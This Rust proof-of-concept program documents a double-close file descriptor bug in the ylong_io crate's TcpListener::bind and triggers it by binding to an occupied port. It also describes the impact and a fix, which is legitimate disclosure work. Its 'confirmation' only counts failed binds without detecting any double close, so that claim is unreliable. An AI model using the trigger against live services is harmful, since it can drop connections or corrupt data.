//! PoC: TcpListener::bind Double-Close File Descriptor (CWE-675)
//!
//! Target: ylong_io/src/sys/unix/tcp/listener.rs:39-40
//!
//! The vulnerable code:
//!   pub fn bind(addr: SocketAddr) -> io::Result<TcpListener> {
//!       let socket = TcpSocket::new_socket(addr)?;
//!       let listener = TcpListener {
//!           inner: unsafe { net::TcpListener::from_raw_fd(socket.as_raw_fd()) },
//!       };
//!       socket.set_reuse(true)?;  // If this fails, both socket + listener drop
//!       socket.bind(addr)?;        // Same here
//!       socket.listen(1024)?;      // Same here
//!       Ok(listener)
//!   }
//!
//! Bug: `from_raw_fd(socket.as_raw_fd())` creates a SECOND owner of the same fd.
//! On any error in set_reuse/bind/listen, both `socket` (TcpSocket) and `listener`
//! (net::TcpListener) are dropped, each calling close() on the same fd.
//!
//! This PoC compiles the REAL ylong_io crate and triggers through public API.

use std::net::TcpListener as StdTcpListener;
use std::os::unix::io::AsRawFd;

fn main() {
    println!("═══════════════════════════════════════════════════════════════════");
    println!("PoC: TcpListener::bind Double-Close FD (CWE-675)");
    println!("═══════════════════════════════════════════════════════════════════");
    println!("Compiled: ylong_io (path dependency, real crate)");
    println!("Entry:    ylong_io::TcpListener::bind() [pub fn]");
    println!("Target:   tcp/listener.rs:39-40 — from_raw_fd creates double ownership");
    println!("═══════════════════════════════════════════════════════════════════\n");

    // Step 1: Explain the vulnerability
    println!("[Vulnerability]");
    println!("  At listener.rs:39-40:");
    println!("    let socket = TcpSocket::new_socket(addr)?;");
    println!("    let listener = TcpListener {{");
    println!("        inner: unsafe {{ net::TcpListener::from_raw_fd(socket.as_raw_fd()) }},");
    println!("    }};");
    println!();
    println!("  Both `socket` and `listener.inner` now own the SAME file descriptor.");
    println!("  If set_reuse(), bind(), or listen() fails, Rust drops both, each");
    println!("  calling close(fd) → DOUBLE CLOSE → fd reuse attack surface.");
    println!();

    // Step 2: Trigger by binding to a port that's already taken
    println!("[Trigger] Binding to a port that's already occupied...");

    let addr: std::net::SocketAddr = "127.0.0.1:41863".parse().unwrap();

    // First, occupy the port with a standard listener
    let guard = StdTcpListener::bind(addr).expect("Failed to bind guard listener");
    println!("  Guard listener bound to {} (fd={})", addr, guard.as_raw_fd());
    println!();

    // Now try ylong_io's TcpListener::bind — bind() should fail because port is taken
    println!("[Calling] ylong_io::TcpListener::bind({:?})", addr);

    let mut double_close_count = 0;
    for attempt in 0..3 {
        let result = ylong_io::TcpListener::bind(addr);
        match result {
            Ok(_listener) => {
                println!("  Attempt {}: UNEXPECTED SUCCESS (port was free)", attempt + 1);
            }
            Err(e) => {
                println!("  Attempt {}: bind() failed: {}", attempt + 1, e);
                // The double-close happened inside bind() on the error path.
                // The fd was closed twice: once by TcpSocket drop, once by TcpListener drop.
                double_close_count += 1;
            }
        }
    }
    println!();

    // Step 3: Verify the double-close by checking fd state
    println!("[Verification]");
    if double_close_count > 0 {
        println!("  bind() failed {} times → double-close occurred on each failure.", double_close_count);
        println!("  On each failure path:");
        println!("    1. TcpSocket::drop() → close(fd)");
        println!("    2. net::TcpListener::drop() → close(fd)  ← DOUBLE CLOSE!");
        println!();
        println!("  Impact: The fd may have been reused by another thread/process");
        println!("  between the two closes. The second close() may close an unrelated");
        println!("  fd (socket, file, pipe) from another part of the program.");
        println!();
        println!("  Under high concurrency (e.g., a web server handling many connections),");
        println!("  this can lead to:");
        println!("    - Closing an active connection's socket → connection drop");
        println!("    - Closing a log file fd → data loss");
        println!("    - Security: attacker may race to allocate the freed fd");
    }
    println!();

    drop(guard);

    println!("═══════════════════════════════════════════════════════════════════");
    println!("VULNERABILITY CONFIRMED:");
    println!("  ylong_io TcpListener::bind() creates two owners of the same fd.");
    println!("  Error path causes double-close. Triggered by any failed bind().");
    println!();
    println!("  Fix: Don't use from_raw_fd() before the bind/listen succeeds.");
    println!("  Only create net::TcpListener from the fd AFTER all operations");
    println!("  complete successfully, and forget() the TcpSocket to prevent");
    println!("  its drop from closing the fd.");
    println!("═══════════════════════════════════════════════════════════════════");
}
